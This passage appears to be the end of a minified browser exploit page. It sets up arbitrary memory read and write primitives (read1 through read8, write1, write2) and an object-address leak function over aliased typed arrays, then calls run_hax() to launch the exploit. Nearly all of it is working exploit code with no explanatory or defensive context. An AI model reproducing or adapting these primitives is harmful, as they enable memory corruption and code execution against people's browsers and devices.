int64?i.low:i},write2:function(a,i){aa[4]=a.low,aa[5]=a.hi;var t=4294901760&ia[0];ia[0]=i instanceof int64?65535&i.low|t:65535&i|t},write1:function(a,i){aa[4]=a.low,aa[5]=a.hi;var t=4294967040&ia[0];ia[0]=i instanceof int64?255&i.low|t:255&i|t},read8:function(a){return aa[4]=a.low,aa[5]=a.hi,new int64(ia[0],ia[1])},read4:function(a){return aa[4]=a.low,aa[5]=a.hi,ia[0]},read2:function(a){return aa[4]=a.low,aa[5]=a.hi,65535&ia[0]},read1:function(a){return aa[4]=a.low,aa[5]=a.hi,255&ia[0]},leakval:function(a){return V.obj=a,new int64(z[4],z[5])}};window.p=ea,run_hax()}</script></body></html>